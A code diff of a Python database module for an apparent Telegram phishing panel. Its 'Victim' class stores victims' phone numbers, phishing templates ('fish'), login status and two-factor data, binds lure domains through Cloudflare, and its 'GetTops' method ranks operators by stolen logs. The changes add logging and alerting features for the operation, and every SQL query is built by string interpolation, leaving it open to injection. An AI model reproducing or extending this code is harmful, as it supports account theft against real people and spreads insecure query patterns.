@@ -1,9 +1,10 @@
 from peewee import SqliteDatabase
 from datetime import datetime
-from os import mkdir
+from os import mkdir, listdir
 from shutil import rmtree
 from config import clf, server_ip
 import json
+from config import timezone
 
 class User:
 
@@ -28,6 +29,12 @@ class User:
                 conn.commit()
             return True
 
+    def UpdateActivity(self, username):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"UPDATE users SET updated_on = '{datetime.now(timezone)}' WHERE username = '{username}';")
+            conn.commit()
+            return True
 
     def GetAllUsers(self):
         with SqliteDatabase(self.database_path) as conn:
@@ -38,12 +45,15 @@ class User:
             return data
 
 
-    def AddUser(self, username, password, note):
+    def AddUser(self, username, password, chat_id, bot_token, note):
         with SqliteDatabase(self.database_path) as conn:
             cursor = conn.cursor()
-            cursor.execute(f"INSERT INTO {self.table}(`username`, `created_on`, `updated_on`, `password_hash`, `note`) VALUES('{username}', '{datetime.utcnow()}', '{datetime.utcnow()}', '{password}', '{note}') ")
+            cursor.execute(f"INSERT INTO {self.table}(`username`, `created_on`, `updated_on`, `password_hash`, `note`, `chat_id`, `bot_token`) VALUES('{username}', '{datetime.now(timezone)}', '{datetime.now(timezone)}', '{password}', '{note}', '{chat_id}', '{bot_token}') ")
             conn.commit()
             mkdir(f'./users/{username}/')
+            mkdir(f'./users/{username}/sessions/')
+            mkdir(f'./users/{username}/uploads/')
+            
             f = open(f'./users/{username}/database.db', 'w')
             f.close()
 
@@ -55,7 +65,9 @@ class User:
                     phone  VARCHAR,
                     domain TEXT,
                     time   DATETIME,
-                    fish   VARCHAR
+                    fish   VARCHAR,
+                    status TEXT,
+                    two_fa TEXT
                 );
                 """)
 
@@ -63,7 +75,7 @@ class User:
                 CREATE TABLE "domains" (
                     "id"	INTEGER NOT NULL UNIQUE,
                     "domain"	TEXT,
-                    "path"	TEXT,
+                    "path"	    TEXT,
                     "servers"	TEXT,
                     "template"	TEXT,
                     "status"	TEXT,
@@ -92,7 +104,7 @@ class User:
             conn.commit()
             rmtree(f'./users/{username}')
             return True
-    
+        
 
     def GetAdmins(self, username):
         with SqliteDatabase(self.database_path) as conn:
@@ -104,6 +116,130 @@ class User:
                 data = [None, None]
             return data
 
+    def GetBotData(self, username):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT chat_id, bot_token FROM users WHERE username = '{username}'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+
+    def GetNews(self):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT * FROM news")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+        
+
+    def AddNews(self, title, desc):
+        try:
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"INSERT INTO news(`title`, `desc`, `date`) VALUES('{title}', '{desc}', '{datetime.now(timezone)}')")
+                conn.commit()
+                return True
+        except:
+            return False
+
+    def EditNews(self, title, desc, id):
+        try:
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"UPDATE news SET title = '{title}', desc = '{desc}' WHERE id = '{id}';")
+                conn.commit()
+                return True
+        except:
+            return False
+        
+
+    def RemoveNews(self, id):
+        try:
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"DELETE FROM news WHERE id = '{id}';")
+                conn.commit()
+                return True
+        except:
+            return False
+
+    def GetInfo(self):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT * FROM info")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+    
+    
+    
+    def AddInfo(self, title, link):
+        try:
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"INSERT INTO info(`title`, `link`) VALUES('{title}', '{link}')")
+                conn.commit()
+                return True
+        except:
+            return False
+
+    def RemoveInfo(self, title):
+        try:
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"DELETE FROM info WHERE title = '{title}';")
+                conn.commit()
+                return True
+        except:
+            return False
+
+
+    def GetTops(self):
+
+        users = listdir('./users/')
+        data = {}
+        for user in users:
+            data
+            with SqliteDatabase(f'./users/{user}/database.db') as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT logs_received, views FROM domains")
+                conn.commit()
+                logs_received = cursor.fetchall()
+        
+            log = 0
+            views = 0
+        
+            for logs in logs_received:
+                log += logs[0]
+                views += logs[1]
+            data[user] = {'logs': log, 'views': views}
+                    
+        return data
+
+
+    def GetLogs(self):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT * FROM logs")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+        
+    def AddLog(self, username, domain, phone, fish, status, two_fa = 'Нет'):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"INSERT INTO logs(username, phone, domain, time, fish, status, two_fa) VALUES('{username}', '{phone}', '{domain}', '{datetime.now(timezone)}', '{fish}', '{status}', '{two_fa}')")
+            conn.commit()
+            return True
+
+    def RemoveLog(self, phone):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"DELETE FROM logs WHERE phone = '{phone}'")
+            conn.commit()
+            return True
+        
 
 
 class Victim:
@@ -118,6 +254,13 @@ class Victim:
             data = cursor.fetchall()
             return data
         
+    def GetCountOfLogs(self):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT SUM(logs_received) as total_logs_received FROM domains;")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
 
     def GetDomains(self):
         with SqliteDatabase(self.database_path) as conn:
@@ -141,7 +284,7 @@ class Victim:
     def GetRedirect(self):
         with SqliteDatabase(self.database_path) as conn:
             cursor = conn.cursor()
-            cursor.execute(f"SELECT redirect FROM domains")
+            cursor.execute(f"SELECT redirect, redirect_on_success FROM domains")
             conn.commit()
             data = cursor.fetchall()
             return data
@@ -164,13 +307,13 @@ class Victim:
                 cursor = conn.cursor()
                 cursor.execute(f"""
                     INSERT INTO domains(domain, path, servers, template, status, security, redirect, redirect_on_success, countries, created_on, app_id, api_hash)
-                    VALUES('{domain}', '{path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}', '{app_id}', '{api_hash}')
+                    VALUES('{domain}', '{path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.now(timezone)}', '{app_id}', '{api_hash}')
                 """)
   
                 conn.commit()
                 mkdir(f"templates/domains/{domain}${path}/")
                 f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
-                f.write("{% extends 'phishes/" + page + "/index.html' %}")
+                f.write("{% set username = '" + username + "' %}\n{% extends 'phishes/" + page + "/index.html' %}")
                 f.close()
 
                 if clf.BindDomain(zone_id, domain, server_ip):
@@ -233,7 +376,7 @@ class Victim:
 
                 mkdir(f"templates/domains/{domain}${path}/")
                 f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
-                f.write("{% extends 'phishes/" + page + "/index.html' %}")
+                f.write("{% set username = '" + username + "' %}\n{% set fish = '" + page + "'%} {% extends 'phishes/" + page + "/index.html' %}")
                 f.close()
                 zones = clf.getDomains()
                 for zone in zones:
@@ -276,5 +419,60 @@ class Victim:
         with SqliteDatabase(self.database_path) as conn:
             cursor = conn.cursor()
             cursor.execute(f"UPDATE domains SET views = views + 1 WHERE domain = '{domain}'")
+            conn.commit()
+            return True
+        
+
+
+    def GetTGData(self, domain):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT app_id, api_hash FROM domains WHERE domain = '{domain}'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+        
+
+    def AddLog(self, domain, phone, fish, status, two_fa = 'Нет'):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"INSERT INTO logs(phone, domain, time, fish, status, two_fa) VALUES('{phone}', '{domain}', '{datetime.now(timezone)}', '{fish}', '{status}', '{two_fa}')")
+            conn.commit()
+            return True
+        
+    def CheckLog(self, phone):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT phone FROM logs WHERE phone = '{phone}'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+
+    def IncreaseLogsNum(self, domain):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"UPDATE domains SET logs_received = logs_received + 1 WHERE domain = '{domain}'")
+            conn.commit()
+            return True
+
+
+    def UpdateLog(self, domain, phone, fish, status, two_fa = 'Нет'):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"""UPDATE logs 
+                    SET domain = '{domain}',
+                    time = '{datetime.now(timezone)}',
+                    fish = '{fish}',
+                    status = '{status}',
+                    two_fa = '{two_fa}'
+                    WHERE phone = '{phone}';""")
+            conn.commit()
+            return True
+        
+
+    def RemoveLog(self, phone):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"DELETE FROM logs WHERE phone = '{phone}'")
             conn.commit()
             return True
